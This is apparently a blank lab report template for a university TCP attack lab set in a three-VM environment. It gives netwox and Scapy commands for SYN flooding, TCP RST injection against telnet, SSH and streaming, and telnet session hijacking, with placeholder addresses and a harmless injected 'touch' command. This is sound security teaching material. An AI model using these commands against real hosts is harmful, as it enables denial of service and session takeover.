# COSC434/534 Lab 3 Report (Live Working Draft)

Name: ____________________
Date: ____________________
Course: COSC434/534
Lab: TCP Attack Lab

## 1. Environment Setup and Verification

### 1.1 VM Identity Table

| VM Role | Hostname | Interface | IP Address | Notes |
|---|---|---|---|---|
| Attacker |  |  |  |  |
| Server |  |  |  |  |
| Client |  |  |  |  |

### 1.2 Commands Used for VM Checks

Run on EACH VM:

```bash
hostname
ip -br a
ip route
```

Ping matrix checks:

```bash
ping -c 2 <target-ip>
```

### 1.3 Tool and Service Checks

Attacker tool checks:

```bash
which netwox
python3 -c "from scapy.all import IP, TCP; print('scapy ok')"
```

Server service checks:

```bash
sudo systemctl status ssh --no-pager
sudo systemctl status openbsd-inetd --no-pager
sudo ss -ltnp | egrep ':22|:23'
```

Observations:

- [ ] All 3 VMs can ping each other
- [ ] netwox available on attacker
- [ ] scapy imports on attacker
- [ ] SSH listening on server port 22
- [ ] Telnet listening on server port 23

## 2. Task 1: SYN Flooding Attack

### 2.1 Baseline (Before Attack)

On server:

```bash
sudo sysctl -q net.ipv4.tcp_max_syn_backlog
netstat -na | grep SYN_RECV
```

Baseline output notes:

- tcp_max_syn_backlog: ____________________
- SYN_RECV count before attack: ____________________

### 2.2 Attack Command (Netwox 76)

On attacker:

```bash
sudo netwox 76 -i <server-ip> -p <target-port>
```

If needed:

```bash
sudo netwox 76 -i <server-ip> -p <target-port> -s raw
```

### 2.3 During Attack Validation

On server (while attack runs):

```bash
netstat -na | grep SYN_RECV
```

Observation notes:

- SYN_RECV behavior: ____________________
- Did legitimate connection degrade/fail? ____________________

### 2.4 SYN Cookies OFF vs ON (Required)

On server:

```bash
sudo sysctl -a | grep syncookies
sudo sysctl -w net.ipv4.tcp_syncookies=0
# run attack and record
sudo sysctl -w net.ipv4.tcp_syncookies=1
# run attack and record
```

Comparison summary:

- With syncookies OFF: ____________________
- With syncookies ON: ____________________

Screenshots/log evidence filenames:

- ____________________

## 3. Task 2: TCP RST Attack on Telnet and SSH

### 3.1 Session Setup

From client:

```bash
telnet <server-ip>
ssh <server-user>@<server-ip>
```

### 3.2 Netwox 78 Attempt

On attacker:

```bash
sudo netwox 78 -d <iface> -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 23"
sudo netwox 78 -d <iface> -f "tcp and src host <client-ip> and dst host <server-ip> and dst port 22"
```

### 3.3 Scapy RST Attempt

```python
from scapy.all import IP, TCP, send
ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(sport=<client-src-port>, dport=<server-port>, flags="R", seq=<seq>, ack=<ack>)
send(ip/tcp, verbose=0)
```

Observations:

- Telnet behavior: ____________________
- SSH behavior: ____________________

## 4. Task 3: TCP RST Attack on Video Streaming (TCP)

### 4.1 Video Session Setup

Victim opens TCP-based video source (not QUIC/YouTube).

### 4.2 RST Command

On attacker:

```bash
sudo netwox 78 -d <iface> -f "tcp and dst host <victim-ip>"
```

Observations:

- Streaming impact: ____________________
- Evidence packet capture file: ____________________

## 5. Task 4: TCP Session Hijacking (Telnet)

### 5.1 Netwox 40 Injection

Hex convert:

```bash
python3 - <<'PY'
cmd = "touch /tmp/tcp_hijack_success\n"
print(cmd.encode().hex())
PY
```

Inject:

```bash
sudo netwox 40 \
  -l <client-ip> \
  -m <server-ip> \
  -j <ttl> \
  -o <client-src-port> \
  -p 23 \
  -q <seq-num> \
  -E <window-size> \
  -r <ack-num> \
  -z \
  -H <hex-command-data>
```

### 5.2 Scapy Injection

```python
from scapy.all import IP, TCP, send
ip = IP(src="<client-ip>", dst="<server-ip>")
tcp = TCP(sport=<client-src-port>, dport=23, flags="A", seq=<seq>, ack=<ack>)
data = "touch /tmp/tcp_hijack_scapy\n"
send(ip/tcp/data, verbose=0)
```

Verification on server:

```bash
ls -l /tmp/tcp_hijack_success /tmp/tcp_hijack_scapy
```

Observations:

- Netwox injection result: ____________________
- Scapy injection result: ____________________

## 6. Final Analysis

- What worked best and why: ____________________
- Key differences between tools (netwox vs scapy): ____________________
- Security lessons learned: ____________________

## 7. Screenshot Index

1. ____________________
2. ____________________
3. ____________________
4. ____________________
5. ____________________
